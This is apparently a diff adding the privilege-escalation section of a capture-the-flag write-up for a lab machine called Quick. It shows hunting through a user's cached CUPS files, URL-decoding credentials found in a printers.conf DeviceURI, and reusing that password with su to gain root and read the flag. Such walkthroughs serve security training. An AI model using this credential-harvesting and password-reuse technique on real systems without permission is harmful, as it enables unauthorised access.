@@ -500,3 +500,53 @@ uid=1001(srvadm) gid=1001(srvadm) groups=1001(srvadm),999(printers)
 ```
 
 ## Privesc
+
+I `looked` at the files in `srvadm's` home `directories` and found a few things that `stood out`:
+
+```bash
+./.cache/conf.d:
+total 20
+drwxr-xr-x 2 srvadm srvadm 4096 Mar 20 06:23 .
+drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 ..
+-rw-r--r-- 1 srvadm srvadm 4569 Mar 20 06:20 cupsd.conf
+-rw-r--r-- 1 srvadm srvadm 4038 Mar 20 06:23 printers.conf
+
+./.cache/logs:
+total 96
+drwxr-xr-x 2 srvadm srvadm  4096 Mar 20 06:46 .
+drwx------ 5 srvadm srvadm  4096 Mar 20 06:20 ..
+-rw-r--r-- 1 srvadm srvadm  9064 Mar 20 06:19 cups.log
+-rw-rw-r-- 1 srvadm srvadm 71479 Mar 20 06:46 debug.log
+-rw-rw-r-- 1 srvadm srvadm  1136 Mar 20 06:39 error.log
+```
+
+The `.cache/conf.d/printers.conf` file contains credentials:
+
+```bash
+[...]
+MakeModel KONICA MINOLTA C554SeriesPS(P)
+DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
+State Idle
+[...]
+```
+
+We can `URL decode` many ways, such as using `PHP`:
+
+```bash
+srvadm@quick:~$ php -r 'echo urldecode("srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb\n");'
+srvadm@quick.htb:&ftQ4K3SGde8?@printerv3.quick.htb
+```
+
+The password `&ftQ4K3SGde8?` is the root password. We can use su and get root access.
+
+```bash
+srvadm@quick:~$ su
+Password: 
+root@quick:/home/srvadm# id
+uid=0(root) gid=0(root) groups=0(root)
+root@quick:/home/srvadm# cat /root/root.txt
+ca70f7b71[...]
+```
+
+
+![info](/assets/img/posts/quick/pwn.png)
